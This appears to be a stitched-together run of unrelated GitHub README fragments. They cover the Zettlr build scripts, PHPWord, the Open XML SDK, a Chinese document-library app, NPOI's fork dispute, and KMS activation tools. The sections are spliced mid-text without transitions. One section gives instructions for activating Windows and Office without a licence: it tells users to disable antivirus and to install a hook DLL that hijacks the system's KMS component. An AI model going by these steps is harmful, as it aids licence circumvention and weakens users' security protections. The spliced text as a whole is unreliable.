The resulting application packages are stored in `./out`.

> This command will skip typechecking to speed up builds, so be extra cautious.

#### `release:{platform-arch}`

Packages the application and then bundles it into an installer for the corresponding platform and architecture. To create such a bundle (may require running on the corresponding platform), one of the following values for `{platform-arch}` is required:

- `release:mac-x64` (Intel-based Macs)
- `release:mac-arm` (Apple Silicon-based Macs)
- `release:win-x64` (Intel-based Windows)
- `release:win-arm` (ARM-based Windows)
- `release:linux-x64` (Intel-based Linux)
- `release:linux-arm` (ARM-based Linux)

The resulting setup bundles are stored in `./release`.

> Please note that, while you can `package` directly for your platform without any suffix, for creating a release specifying the platform is required as electron-builder would otherwise include the development-dependencies in the `app.asar`, resulting in a bloated application.

#### `csl:refresh`

This downloads the [Citation Style Language](https://citationstyles.org/) (CSL) files with which the application is shipped, and places them in the `static/csl-locales`- and `static/csl-styles`-directories respectively.

> Please note, that this command is intended for an automated workflow that runs from time to time on the repository to perform this action. This means: Do **not** commit updated files to the repository. Instead, the updated files will be downloaded whenever you `git fetch`.

#### `lint`

This simply runs [ESLint](https://eslint.org/). Apps such as [Atom](https://atom.io/) or [Visual Studio Code](https://code.visualstudio.com/) will automatically run ESLint in the background, but if you want to be extra-safe, make sure to run this command prior to submitting a Pull Request.

> This command will run automatically on each Pull Request to check your code for inconsistencies.

#### `test`

This runs the unit tests in the directory `./test`. Make sure to run this command prior to submitting a Pull Request, as this will be run every time you commit to the PR, and this way you can make sure that your changes don't break any tests, making the whole PR-process easier.

#### `test-gui`

Use this command to carefree test any changes you make to the application. This command will start the application as if you ran `yarn start`, but will provide a custom configuration and a custom directory.

> This command will skip typechecking to speed up builds, so be extra cautious.

**The first time you start this command**, pass the `--clean`-flag to copy a bunch of test-files to your `./resources`-directory, create a `test-config.yml` in your project root, and start the application with this clean configuration. Then, you can adapt the `test-config.yml` to your liking (so that certain settings which you would otherwise _always_ set will be pre-set without you having to open the preferences).

Whenever you want to reset the test directory to its initial state (or you removed the directory, or cloned the whole project anew), pass the flag `--clean` to the command in order to create or reset the directory. **This is also necessary if you changed something in `test-config.yml`**.

If you want to prevent a config-file from being created (e.g., to simulate the first start experience), you can pass the flag `--no-config` to this command.

You can pass additional command-line switches such as `--clear-cache` to this command as well. They will be passed to the child process.

> Attention: Before first running the command, you **must** run it with the `--clean`-flag to create the directory in the first place!

Additionally, have a look at our [full development documentation](https://docs.zettlr.com/en/get-involved).

### Directory Structure

Zettlr is a mature app that has amassed hundreds of directories over the course of its development. Since it is hard to contribute to an application without any guidance, we have compiled a short description of the directories with how they interrelate.

```

### On the Distinction between Modules and Service Providers

You'll notice that Zettlr contains both ""modules"" and ""service providers"". The difference between the two is simple: Service providers run in the main process and are completely autonomous while providing functionality to the app as a whole. Modules, on the other hand, provide functionality that must be triggered by user actions (e.g. the exporter and the importer).

### The Application Lifecycle

Whenever you run Zettlr, the following steps will be executed:

0. Execute `source/main.ts`
1. Environment check (`source/app/lifecycle.ts::bootApplication`)
2. Boot service providers (`source/app/lifecycle.ts::bootApplication`)
3. Boot main application (`source/main/zettlr.ts`)
4. Load the file tree and the documents
5. Show the main window

And when you shut down the app, the following steps will run:

1. Close all windows except the main window
2. Attempt to close the main window
3. Shutdown the main application (`source/main/zettlr.ts::shutdown`)
4. Shutdown the service providers (`source/app/lifecycle.ts::shutdownApplication`)
5. Exit the application

During development of the app (`yarn start` and `yarn test-gui`), the following steps will run:

1. Electron forge will compile the code for the main process and each renderer process separately (since these are separate processes), using TypeScript and webpack to compile and transpile.
2. Electron forge will put that code into the directory `.webpack`, replacing the constants you can find in the ""create""-methods of the window manager with the appropriate entry points.
3. Electron forge will start a few development servers to provide hot module reloading (HMR) and then actually start the application.

Whenever the app is built, the following steps will run:

1. Electron forge will perform steps 1 and 2 above, but instead of running the app, it will package the resulting code into a functional app package.
2. Electron builder will then take these pre-built packages and wrap them in a platform-specific installer (DMG-files, Windows installer, or Linux packages).

Electron forge will put the packaged applications into the directory `./out` while Electron builder will put the installers into the directory `./release`.

## Command-Line Switches

The Zettlr binary features a few command line switches that you can make use of for different purposes.

#### `--launch-minimized`

This CLI flag will instruct Zettlr not to show the main window on start. This is useful to create autostart entries. In that case, launching Zettlr with this flag at system boot will make sure that you will only see its icon in the tray.

Since this implies the need to have the app running in the tray bar or notification area when starting the app like this, it will automatically set the corresponding setting `system.leaveAppRunning` to true.

> Note: This flag will not have any effect on Linux systems which do not support displaying an icon in a tray bar or notification area.

#### `--clear-cache`

This will direct the File System Abstraction Layer to fully clear its cache on boot. This can be used to mitigate issues regarding changes in the code base. To ensure compatibility with any changes to the information stored in the cache, the cache is also automatically cleared when the version field in your `config.json` does not match the one in the `package.json`, which means that, as long as you do not explicitly set the `version`-field in your `test-config.yml`, the cache will always be cleared on each run when you type `yarn test-gui`.

#### `--data-dir=path`

Use this switch to specify custom data directory, which holds your configuration files. Without this switch data directory defaults to `%AppData%/Zettlr` (on Windows 10), `~/.config/Zettlr` (on Linux), etc. The path can be absolute or relative. Basis for the relative path will be either the binary's directory (when running a packaged app) or the repository root directory (when running an app that is not packaged). If the path contains spaces, do not forget to escape it in quotes. `~` to denote home directory does not work. Due to the bug in Electron an empty `Dictionaries` subdirectory is created in the default data directory, but it does not impact functionality.

#### `--disable-hardware-acceleration`

This switch causes Zettlr to disable hardware acceleration, which could be necessary in certain setups. For more information on why this flag was added, see issue [#2127](https://github.com/Zettlr/Zettlr/issues/2127).


## VSCode Extension Recommendations

This repository makes use of Visual Studio Code's [recommended extensions feature](https://go.microsoft.com/fwlink/?LinkId=827846). This means: If you use VS Code and open the repository for the first time, VS Code will tell you that the repository recommends to install a handful of extensions. These extensions are recommended if you work with Zettlr and will make contributing much easier. The recommendations are specified in the file `.vscode/extensions.json`.

Since installing extensions is sometimes a matter of taste, we have added short descriptions for each recommended extension within that file to explain why we recommend it. This way you can make your own decision whether or not you want to install any of these extensions (for example, the SVG extension is not necessary if you do not work with the SVG files provided in the repository).

If you choose not to install all of the recommended extensions at once (which we recommend), VS Code will show you the recommendations in the extensions sidebar so you can first decide which of the ones you'd like to install and then manually install those you'd like to have.

> Using the same extensions as the core developer team will make the code generally more consistent since you will have the same visual feedback.

```
or if you want the latest unreleased version
```sh
composer require phpoffice/phpword:dev-master
```

## Getting started

The following is a basic usage example of the PHPWord library.

```php
<?php
require_once 'bootstrap.php';

// Creating the new document...
$phpWord = new \PhpOffice\PhpWord\PhpWord();

/* Note: any element you append to a document must reside inside of a Section. */

// Adding an empty Section to the document...
$section = $phpWord->addSection();
// Adding Text element to the Section having font styled by default...
$section->addText(
    '""Learn from yesterday, live for today, hope for tomorrow. '
        . 'The important thing is not to stop questioning."" '
        . '(Albert Einstein)'
);

/*
 * Note: it's possible to customize font style of the Text element you add in three ways:
 * - inline;
 * - using named font style (new font style object will be implicitly created);
 * - using explicitly created font style object.
 */

// Adding Text element with font customized inline...
$section->addText(
    '""Great achievement is usually born of great sacrifice, '
        . 'and is never the result of selfishness."" '
        . '(Napoleon Hill)',
    array('name' => 'Tahoma', 'size' => 10)
);

// Adding Text element with font customized using named font style...
$fontStyleName = 'oneUserDefinedStyle';
$phpWord->addFontStyle(
    $fontStyleName,
    array('name' => 'Tahoma', 'size' => 10, 'color' => '1B2232', 'bold' => true)
);
$section->addText(
    '""The greatest accomplishment is not in never falling, '
        . 'but in rising again after you fall."" '
        . '(Vince Lombardi)',
    $fontStyleName
);

// Adding Text element with font customized using explicitly created font style object...
$fontStyle = new \PhpOffice\PhpWord\Style\Font();
$fontStyle->setBold(true);
$fontStyle->setName('Tahoma');
$fontStyle->setSize(13);
$myTextElement = $section->addText('""Believe you can and you\'re halfway there."" (Theodor Roosevelt)');
$myTextElement->setFontStyle($fontStyle);

// Saving the document as OOXML file...
$objWriter = \PhpOffice\PhpWord\IOFactory::createWriter($phpWord, 'Word2007');
$objWriter->save('helloWorld.docx');

// Saving the document as ODF file...
$objWriter = \PhpOffice\PhpWord\IOFactory::createWriter($phpWord, 'ODText');
$objWriter->save('helloWorld.odt');

// Saving the document as HTML file...
$objWriter = \PhpOffice\PhpWord\IOFactory::createWriter($phpWord, 'HTML');
$objWriter->save('helloWorld.html');

/* Note: we skip RTF, because it's not XML-based and requires a different example. */
/* Note: we skip PDF, because ""HTML-to-PDF"" approach is used to create PDF documents. */
```

More examples are provided in the [samples folder](samples/). For an easy access to those samples launch `php -S localhost:8000` in the samples directory then browse to [http://localhost:8000](http://localhost:8000) to view the samples.

2. 本项目的目标受众是<b>有【Web 幻灯片】开发需求的开发者</b>，提供的链接只是一个演示地址，不提供任何在线服务。你不应该直接将本项目作为工具使用，也不支持一键部署。
如果你只是需要一个服务或工具，可以选择更优秀和成熟的产品，例如：[石墨文档](https://shimo.im/)、[金山文档](https://www.kdocs.cn/)、[Slidev](https://sli.dev/)、[revealjs](https://revealjs.com/) 等。
3. 本项目是基于 DOM 的渲染方案，优点是简单易上手。但是相比 Canvas 渲染的方案，在复杂场景下性能会存在一定的差距，所以如果你对性能有较高的要求，本项目可能不是一个好的选择/参考方向。
4. 这里总结了一些[常见问题](https://github.com/pipipi-pikachu/PPTist/blob/master/doc/Q&A.md)，第一次提 Issues 和 PR 时，务必提前阅读此文档。

Open XML SDK
============

> NOTICE: 
> 
> [v3.0.0 beta 3](https://www.nuget.org/packages/DocumentFormat.OpenXml/3.0.0-beta0003) refactors and addresses some technical debt, with the goal to retain (as much as possible) source compatibility. We hope to maintain things such that you can update your package and recompile with limited changes. However, binary compatibility is not a goal and will break that for some changes which we plan on keeping documented. PRs that introduce such changes are marked with a `breaking-change` label and are added to a list to help migrating to v3.0.0.
>
> Please see the [v3.0.0 milestone](https://github.com/OfficeDev/Open-XML-SDK/milestone/1) for issues and PRs that are included. For discussions, please join us at [this issue](https://github.com/OfficeDev/Open-XML-SDK/issues/1270).

The Open XML SDK provides tools for working with Office Word, Excel, and PowerPoint documents. It supports scenarios such as:

- High-performance generation of word-processing documents, spreadsheets, and presentations.
- Document modification, such as adding, updating, and removing content and metadata.
- Search and replace content using regular expressions.
- Splitting up (shredding) a file into multiple files, and combining multiple files into a single file.
- Updating cached data and embedded spreadsheets for charts in Word/PowerPoint.

# Packages

The official release NuGet packages for Open XML SDK are on NuGet.org:

| Package | Download |
|---------|----------|
| DocumentFormat.OpenXml | [![NuGet](https://img.shields.io/nuget/v/DocumentFormat.OpenXml.svg)](https://www.nuget.org/packages/DocumentFormat.OpenXml) |
| DocumentFormat.OpenXml.Linq | [![NuGet](https://img.shields.io/nuget/v/DocumentFormat.OpenXml.Linq.svg)](https://www.nuget.org/packages/DocumentFormat.OpenXml.Linq) |
| DocumentFormat.OpenXml.Features | [![NuGet](https://img.shields.io/nuget/v/DocumentFormat.OpenXml.Features.svg)](https://www.nuget.org/packages/DocumentFormat.OpenXml.Features) |

## Daily Builds

The NuGet package for the latest builds of the Open XML SDK is available as a custom feed on an Azure blob. Stable releases here will be mirrored onto NuGet and will be identical. You must set up a [NuGet.config](https://docs.microsoft.com/en-us/nuget/reference/nuget-config-file) file that looks similar to this:

```xml
<?xml version=""1.0"" encoding=""utf-8""?>
<configuration>
  <packageSources>
    <add key=""OpenXmlCI"" value=""https://openxmlsdk.blob.core.windows.net/feed/index.json"" />
  </packageSources>
</configuration>
```

For latests changes, please see the [changelog](CHANGELOG.md)

## Framework Support

The package currently supports the following targets:

- .NET Framework 3.5, 4.0, 4.6
- .NET Standard 2.0
- .NET 6.0

For details on platform support, including other runtimes such as Mono and Unity, please see the docs at https://docs.microsoft.com/en-us/dotnet/standard/net-standard.

- [Microsoft Q&A Forums](https://docs.microsoft.com/en-us/answers/topics/office-addins-dev.html) (tag: **office-addins-dev**)
- [Stack Overflow](http://stackoverflow.com) (tags: **openxml** or **openxml-sdk**)

# Known Issues

- On .NET Core and .NET 5, zip packages do not have a way to stream data. Thus, the working set can explode in certain situations. This is a [known issue](https://github.com/dotnet/runtime/issues/1544).
- On .NET Core, targeting .NET Framework 4.5+, and .NET 5, `System.Uri` will not parse invalid links. This causes an exception. A workaround in v2.12.0+ of OpenXml SDK is to use `OpenSettings.RelationshipErrorRewriter` to rewrite them to something that can be parsed. A discussion is available [here](https://github.com/dotnet/runtime/issues/26084) to enable something more robust in `System.IO.Packaging`.
- On .NET Framework, an `IsolatedStorageException` may be thrown under certain circumstances. This generally occurs when manipulating a large document in an environment with an AppDomain that does not have enough evidence. A sample with a workaround is available [here](/samples/IsolatedStorageExceptionWorkaround).

# Documentation

The functionality of the specific classes in this version of the Open XML SDK is similar to version 2.5, therefore the [Open XML SDK 2.5 for Office](https://learn.microsoft.com/en-us/office/open-xml/open-xml-sdk) documentation available on Microsoft Learn still applies.

In addition to open sourcing of the SDK, Microsoft has opened up the conceptual documentation for public review / contributions.  A copy of the documentation is  available for you to edit and review [in GitHub](https://github.com/OfficeDev/office-content).

<a name=""intro""></a>
## 文库简介

还在读大学的时候，当时就想着要搭建一个类似百度文库的文库站点，实现文档在线浏览。

然而，时间一晃，好几年过去了，自己终于亲自动手开发实现了一套开源文库程序。

尽管离百度文库还有着巨大的差距，尽管可(一)能(定)会存在Bug，但是，整套程序从前端到后端到数据库再到丑陋的LOGO设计，都是自己独立完成的，满满的成就感...

<a name=""name""></a>
### 程序命名
起初开发这套程序，是想自己做一个IT行业的文库站点，也就是现在的[IT文库(http://wenku.it)](http://wenku.it)，当初给文库起名就叫`IT文库`，但是决定开源出来之后，觉得这样不妥，于是起了个叫`DocHub`的名字。

毕竟，有个Git仓库管理的站点叫`GitHub`，那文档(Doc)仓库也就是文库，我干嘛不叫`DocHub`呢？

`DocHub`的中文名叫`多哈`，程序猿，写代码就要开心，开心就要`哈哈哈哈哈哈哈哈`，多`哈`...(好幼稚)

<a name=""source""></a>
## 源码地址
程序源码，托管在`GitHub`和`Gitee`

## QQ交流群
为方便相互学习和交流，建了个QQ群，加群请备注`来自DocHub`

> QQ交流群：457803862(猿军团)

同时要说明的是，这个是学习交流群，如果是程序相关问题，请提交issue，再把issue链接发群里。


<a name=""stack""></a>
## 主要技术栈

<a name=""be""></a>
### 后端

Go语言框架[Beego](https://beego.me)

<a name=""fe""></a>
### 前端

基于Bootstrap的前端框架[Flat-UI](https://github.com/designmodo/Flat-UI)

<a name=""db""></a>
### 数据库

MySQL，数据存储

<a name=""env""></a>
### 依赖环境

<a name=""office""></a>
#### Libreoffice(或Openoffice)

用于将office文档转PDF

使用命令:
```
soffice --headless --invisible --convert-to pdf path/to/officefile --outdir path/to/outdir
```

<a name=""pdf2svg""></a>
#### pdf2svg

> 注意，这个要用最新版的`pdf2svg`

pdf2svg，用于将PDF转成svg矢量图片，以供阅读。

使用命令：
```
pdf2svg <in file.pdf> <out file.svg> [<page no>]
```

<a name=""calibre""></a>
#### calibre

用于将`mobi`、`chm`、`epub`等文档转成PDF，然后再将`pdf`转成`svg`

> 注意：目前`mobi`、`epub`等文档的在线阅读功能还没有实现

<a name=""oss""></a>
#### 阿里云OSS
存储office文档、PDF文档以及svg等文件

> 注意：目前只支持阿里云的OSS云存储，暂时不支持其他云存储(后期我再抽时间开发和扩展其他云存储)，不支持本地化存储(现在云存储和CDN价钱比以前便宜多了)

<a name=""feature""></a>
## 功能特点

<a name=""read-svg""></a>
### 文档在线阅读
`DocHub`文库通过`svg`矢量图来实现文档阅读体验的，我知道的文库站点中，[新浪爱问](http://ishare.iask.sina.com.cn/)是通过`png`等图片提供文档阅读体验的。

`SVG`相比`png`、`jpeg`等图片格式有很大的优势，至少放大不会失真，而且与JPEG 和 GIF 图像比起来，svg尺寸更小，可压缩性更强，`DocHub`通过gzip，将svg文件压缩，一般情况下，能减少70%的文件大小，比如200kb的svg，gzip压缩后，只有60kb左右的大小。

使用svg，大大提升了加载速度，优化了内容的阅读体验。

<a name=""read-office""></a>
#### office文档在线阅读

这个需要经过两层转化:
```
office --> pdf --> svg
```
![office文档在线阅读](static/tutorial/preview.png)

> 之前有考虑过office文档不经过转化，然后直接在线浏览的，但是方案比较复杂，部署不容易，至少我没部署成功过...

<a name=""read-pdf""></a>
#### PDF文档在线阅读

将PDF文档通过`pdf2svg`转化，提供在线阅读

> 没有使用mozila的`pdf.js`作为PDF文档阅读的实现方案，主要是我没有解决`pdf.js`分片分页加载的问题，每次都需要将整个PDF文档下载下来才能提供阅读。如果文档大的话，用户需要等待好长时间，而且也比较耗费服务器带宽资源。

<a name=""read-other""></a>
#### mobi、epub、chm文档在线阅读
使用`calibre`将文档转成PDF，然后pdf再转svg。

> 目前该功能还没实现，epub、mobi等文档，现在还是暂时不能在线阅读

<a name=""es""></a>
### 全文搜索
全文搜索功能，之前是使用`coreseek`开发实现了这个功能的，但是现在`coreseek`的官网都已经挂了...打算用`elasticsearch`重新实现这个功能。

<a name=""crawl""></a>
### 文档采集功能【TODO】
建站初期，站点内容的填充，是一个大难点。

然而，`GitBook`、`ReadTheDoc`等站点上，就有一大堆的开源技术文档，提供`mobi`、`pdf`、`epub`离线文档下载。

初略统计了一下，`GitBook`有10多万文档，按可用文档为5万估算，每份文档，提供3种格式的下载，光从gitbook采集文档，做成文库，就有15万多的文档了。

然后，你再借助下搜索引擎，搜索`filetype:文档格式 + 搜索关键字`，如`filetype:pdf 入门教程`，你就会发现惊喜！不信，你试着赋值下面两个链接地址在浏览器打开：


```
https://cn.bing.com/search?q=filetype%3apdf+%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B&first=11
```

```
https://www.sogou.com/web?query=filetype%3Apdf+%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B
```

如果再爬其他文档，一年之内，单枪匹马搞个上百万文档的文库站点，应该不是个事儿。

不过，现在综合类的文库站点，如百度文库等已经做起来了，如果你打算做综合类的文库站点，还是不现实，因为空间太小了.

但是，你可以做专注于某一个方向的文库站点，比如课后习题答案文库站点、IT行业文库站点、教育类文库站点等，专注于一个行业领域方向，还是有很大成长空间的。就好比图片站点，现在很多搜索引擎都能搜索图片，但是`Pinterest`、`花瓣网`等还不是做起来了吗？

> 给你提供了程序，还给你提供了思路，给个`star`鼓励一下？

<a name=""score""></a>
### 积分功能
用户签到、上传分享文档，获得积分奖励；用户下载文档，需要消耗积分

<a name=""watermark""></a>
### 阅读文档水印功能
在提供阅读的svg文件上添加水印

<a name=""page""></a>
### 页面一览

<a name=""tutorial""></a>
## 使用教程

当运行程序的时候，程序会自动初始化数据，默认的初始管理员账号密码均是`admin`

但是由于环境依赖安装问题，所以有必要整理一个使用教程处理，使用教程放在[书栈网(BookStack)](https://www.bookstack.cn)上，教程地址：[https://www.bookstack.cn/books/dochub](https://www.bookstack.cn/books/dochub)

<a name=""demo""></a>
## 演示站点

目前还没有搭建演示站点，争取在这周内搭建出来。

不过，在这之前，你可以访问[IT文库(http://wenku.it)](http://wenku.it)看网站效果，但是由于这个站点，在进行迁移的时候，部分依赖没配置好，所以上传的office、PDF等文档，暂时不支持预览，搜索功能也用不了。

所以，请耐心等待，届时搭建好了演示站点，会把演示站点的管理员账号密码放出来，以便体验使用。

<a name=""tpl""></a>
## 文库模板

`DocHub`文库的前端模板，包括PC模板和移动端模板，也会放出来。但是，模板可能跟套在程序上的有差距，毕竟在开发的时候有对页面做了一些调整。

<a name=""support""></a>
## 赞助我

由于整套程序都是独立一个人开发完成，限于个人经验、知识面和技术栈体系的限制，现在的程序不会是完美的，但至少，我在努力，我会争取把开源文库程序做好，缩短与成熟文库系统的差距。

所以，给出你的意见和建议，给出你的打赏与鼓励，让我知道，我不是一个人在孤独地战斗。

*Office Retail must be [converted](https://github.com/kkkgo/office-C2R-to-VOL) to Volume first, before it can be activated with KMS.  
KMS activation on Windows 7 have a limitation related to SLIC 2.1 and Windows marker
## How To Use:
>Remove any other KMS solutions.  
Temporary suspend Antivirus realtime protection, or exclude the downloaded file and extracted folder from scanning to avoid quarantine.  
Extract the downloaded file contents to a simple path without special characters or long spaces.  
Administrator rights are require to run the activation script(s).  

**KMS_VL_ALL offer 3 flavors of activation modes:**
### Manual mode (without leaving any KMS emulator traces in the system.)
make sure that auto renewal solution is not installed, or remove it  
then, just run **Activate.cmd**  

>You will have to run Activate.cmd again before the **KMS activation period expire**(default 180 days).  
You can run Activate.cmd anytime during that period to renew the period to the max interval.  
If Activate.cmd is accidentally terminated before it completes, run the script again to clean any leftovers.  

### Auto Renewal mode (the system itself handle and renew activation per schedule.)
first, run the script AutoRenewal-Setup.cmd, press **Y** to approve the installation  
then, just run **Activate.cmd**  

>If you use Antivirus software, it is best to exclude this file from scanning protection:
**C:\Windows\System32\SppExtComObjHook.dll**

### Online KMS mode:

You may use Activate-Local.cmd for online activation,
if you have valid/trusted external KMS host server.
 - edit Activate.cmd with Notepad (or text editor)
 - change External=0 to 1
 - change KMS_IP=172.16.0.2 to the IP/address of the server
 - save the script, and run it as administrator

## Setup Preactivate:

 - To preactivate the system during installation, copy $oem$ folder to sources folder in the installation media (iso/usb).

 - If you already use another setupcomplete.cmd, rename this one to KMS_VL_ALL.cmd or similar name
then add a command to run it in your setupcomplete.cmd, example:
call KMS_VL_ALL.cmd

 - Use AutoRenewal-Setup.cmd if you want to uninstall the project afterwards.

>Notes:  
The included setupcomplete.cmd support the Additional Options described previously, except Unattended Switches.
Use AutoRenewal-Setup.cmd if you want to uninstall the project afterwards.
In Windows 8 and later, running setupcomplete.cmd is disabled if the default installed key for the edition is OEM Channel.

# KMS_VL_ALL - 一个精巧灵活的激活批处理
>准备：把KMS_VL_ALL目录放到合适的位置（无特殊字符的路径），删除或卸载其他相关KMS软件，退出杀毒软件。  
零售版office需要经过[转换](https://github.com/kkkgo/office-C2R-to-VOL)成VL后才能使用KMS激活。  
*注意：由于微软的限制，对于BIOS具有SLIC的品牌机，可能无法使用KMS激活Window7系统。[支持的产品](https://github.com/kkkgo/KMS_VL_ALL#supported-volume-products)
 
## 使用一次性的KMS手动续期激活（系统不会增加任何文件）
如果你不需要自动续期，可以直接右键管理员运行**Activate.cmd**即可。  
你必须在KMS到期（默认是180天）前再次运行一次。 
>Activate.cmd是一个自动激活本机所有批量产品的批处理。
它可以单独使用，如果你想用第三方的KMS服务器的话，可以编辑设置External值为1，并填上IP（或者域名）和port（默认1688）。  

## 安装自动续期的KMS激活（系统会增加计划任务和必要的hook）
  - 1、
 先右键管理员运行脚本**AutoRenewal-Setup.cmd**，这是一个带有KMS服务器的hook，会劫持系统的KMS组件，请让杀毒软件放行，输入y安装；如果你需要卸载，只需要再次运行他，输入y卸载。如果您使用防病毒软件，最好从扫描保护中排除此文件：
**C:\Windows\System32\SppExtComObjHook.dll**
  - 2、运行**Activate.cmd**即可
>不管你是用哪种方式激活，如果你安装了新的产品，你仍至少需要运行一次**Activate.cmd**来处理产品激活。

## 其他文件
 - **Check-Activation-Status-vbs.cmd** 是检查激活状态的脚本（使用VBS）。  
 - **Check-Activation-Status-wmic.cmd** 是检查激活状态的脚本（使用WMI）。  
 - **$OEM$** 是用于封装系统部署自动激活的文件夹。

    Mayan EDMS is a wonderful product with a lot of features.
    However, its sheer number of features and capabilities can be a bit intimidating for the average user.
    This is where Open Paperless comes in. Open Paperless is a re-think
    of the user interface and user experience for Mayan EDMS.
    The goal is to reduce the complexity and make it more suitable for
    home users. Think of Open Paperless as a lightweight version of Mayan EDMS.

## Documentation

Visit the [documentation](http://fluentribbon.github.io/documentation/).  
Almost all features are shown in the [showcase application](./Fluent.Ribbon.Showcase).  
The showcase application is included with every release, so you can download stable versions from [releases](../../releases) and preview versions from [CI artifacts](https://ci.appveyor.com/project/batzen/fluent-ribbon/branch/develop/artifacts).  
If you think there is something missing in the showcase application feel free to create an issue for that.

To be more familiar with the Ribbon concept see [msdn article](https://docs.microsoft.com/en-us/windows/desktop/uxguide/cmd-ribbons).

## History &amp; roadmap

A history of changes is maintained in the [Changelog](Changelog.md).
The roadmap is done by [milestones](../../milestones).

If you feel lack of some important features feel free to use [issues](https://github.com/fluentribbon/Fluent.Ribbon/issues) to create an issue/feature request.

## Access to preview versions

You can access preview versions through the [AppVeyor nuget feed](https://ci.appveyor.com/nuget/fluent-ribbon).

## What you can do to help us

- We are accepting pull requests, so you are very welcome to create one
- [Fix some bugs](../../issues)

  - Includes a GUI for simple managing.
  - Uses `sqlite` for persistent data storage.

## Documentation
The wiki has been completly reworked and is now available on [readthedocs.com](https://py-kms.readthedocs.io/en/latest/). It should you provide all necessary information how to setup and to use _py-kms_ , all without clumping this readme. The documentation also houses more details about activation with _py-kms_ and how to get GVLK keys.
       
## Quick start
- To start the server, execute `python3 pykms_Server.py [IPADDRESS] [PORT]`, the default _IPADDRESS_ is `0.0.0.0` ( all interfaces ) and the default _PORT_ is `1688`. Note that both the address and port are optional. It's allowed to use IPv4 and IPv6 addresses. If you have a IPv6-capable dual-stack OS, a dual-stack socket is created when using a IPv6 address.
- To start the server automatically using Docker, execute `docker run -d --name py-kms --restart always -p 1688:1688 pykmsorg/py-kms`.
- To show the help pages type: `python3 pykms_Server.py -h` and `python3 pykms_Client.py -h`.
- For launching _py-kms_ GUI make the file `pykms_Server.py` executable with `chmod +x /path/to/folder/py-kms/pykms_Server.py`, then simply run `pykms_Server.py` by double-clicking.

# NPOI

[![NuGet](https://img.shields.io/nuget/v/DotNetCore.NPOI.svg)](https://www.nuget.org/packages/DotNetCore.NPOI)
[![Build status](https://ci.appveyor.com/api/projects/status/k774la3yfxf0yfv8?svg=true)](https://ci.appveyor.com/project/yuleyule66/npoi)

This project is migrated from Tony Qu's [NPOI](https://github.com/tonyqus/npoi) by .NET Core Community.

## Announcement

The root upstream project of the NPOI project is [tonyqus/NPOI](https://github.com/tonyqus/NPOI), which is the .NET version of the [Apache POI](https://github.com/apache/poi). [tonyqus/NPOI](https://github.com/tonyqus/NPOI) is the project with the largest number of downloads of nuget packages in the Chinese-speaking area. Developers at home and abroad know that this kind of glory and contribution cannot be obliterated. Just like Linux has derived so many distributions, but no one can deny Linus's contribution.

[dotnetcore/NPOI](https://github.com/dotnetcore/NPOI), as a downstream project of the [tonyqus/NPOI](https://github.com/tonyqus/NPOI) project, was born at the end of 2016. At that time, developers urgently needed the .NET Core version of NPOI. At that time, after receiving a reply from tonyqus, he **made it clear** that he ""has no intention of migrating and maintaining the .NET Core version."" So [dotnetcore/NPOI](https://github.com/dotnetcore/NPOI) was born. It forks from [tonyqus/NPOI](https://github.com/tonyqus/NPOI) and is known to upstream project authors. The upstream project author has repeatedly asked @alexinea about the progress of the [dotnetcore/NPOI](https://github.com/dotnetcore/NPOI) unit test.

The migration method of [dotnetcore/NPOI](https://github.com/dotnetcore/NPOI) is that @yang-xiaodong migrates file by file. All readers can understand that the namespace and file directory between the two projects have undergone a lot of changes. In the readme file (README.MD) uploaded for the first time, @yang-xiaodong has stated that this project is the .NET Core version of NPOI, and the NPOI project is still under [tonyqus/NPOI](https://github.com/tonyqus/NPOI).

```
This project is for NPOI Core. NPOI is still under at [https://github.com/tonyqus/npoi](https://github.com/tonyqus/npoi)
```

Mr. Yang has no intention of maintaining the .NET Framework version, and tony qu has no intention of migrating and maintaining the .NET Core version. Therefore, it means that this project is only the .NET Core version of NPOI, and the original version is still in tonyqus.

In subsequent versions, Mr. Yang also made it clear in the readme file that this project was migrated from [tonyqus/NPOI](https://github.com/tonyqus/NPOI).

After @yang-xiaodong learned that @tonyqus clearly did not intend to migrate and maintain [tonyqus/NPOI](https://github.com/tonyqus/NPOI) to .NET Core, with the assistance of GitHub, removed the fork relationship between [dotnetcore/NPOI](https://github.com/dotnetcore/NPOI) and [tonyqus/NPOI](https://github.com/tonyqus/NPOI). Since then, the [dotnetcore/NPOI](https://github.com/dotnetcore/NPOI) project has become an independent downstream project to exist and develop independently, just like a Linux downstream distribution project.

For open source projects, it is impossible for everyone to be so perfect and rigorous at all times, as long as they do not violate the open source agreement or license. Mr. Yang has no intention and NCC has no intention to obliterate any glory of @tonyqus.

We believe that [dotnetcore/NPOI](https://github.com/dotnetcore/NPOI) has completed her historical mission. She gave a choice when the community most needed the .NET Core version of NPOI.

As an upstream project, tony qu has no right to require downstream projects to be archived. Has anyone heard that upstream Linux distributions can require downstream Linux distributions to be archived?

After discussion within the NCC PMC, it was decided not to argue with him, and to block him at the organizational level.

So the storm came, tony qu contacted to persuade NCC member projects to leave NCC, contacted Microsoft to ask for DMCA dotnetcore (because he thought github.com/dotnetcore was too formal) and so on. This series of actions led to controversy in the Natasha WeChat group. But on the contrary, the NCC QQ group and WeChat group did not discuss this matter-because everyone knew that [dotnetcore/NPOI](https://github.com/dotnetcore/NPOI) did not violate any open source license.

We condemn the behavior of some people passing screenshots of chats in the Natasha WeChat group to tony qu. The author of Natasha, LanX, said at the beginning: If everyone wants to argue, he can just create a new group and let tonyqu come in and discuss it together. I wonder if the person who secretly took the screenshot told tony qu this sentence?

What's more, the Natasha WeChat group is not an NCC group. It is only a Natasha technology studying group, but it is recognized as an NCC group by tony qu. The speeches in the group are also spread everywhere by tony qu. I don't know if he really doesn't know the difference, or pretends he doesn't know the difference.

We don't intend to spend more time entangled with tony qu. After discussing with the NCC PMC, we now decide to archive [dotnetcore/NPOI](https://github.com/dotnetcore/NPOI) to prevent the NCC community from getting into bigger disputes. If there is no accident, we will not make any response to this matter in the future.

[We NCC](https://github.com/dotnetcore) thank the developers for their support and understanding, and we NCC are willing to work with developers and open source communities, including you, to make more contributions to .NET technology and ecology.

## What is NPOI ?

NPOI is the .NET version of POI Java project at http://poi.apache.org/. POI is an open source project which can help you read/write xls, doc, ppt files. It has a wide application.

For example, you can use it to
* generate a Excel report without Microsoft Office suite installed on your server and more efficient than call Microsoft Excel ActiveX at background;
* extract text from Office documents to help you implement full-text indexing feature (most of time this feature is used to create search engines). 
* extract images from Office documents
* generate Excel sheets that contains formulas

## Install NuGet Package

```powershell
Install-Package DotNetCore.NPOI
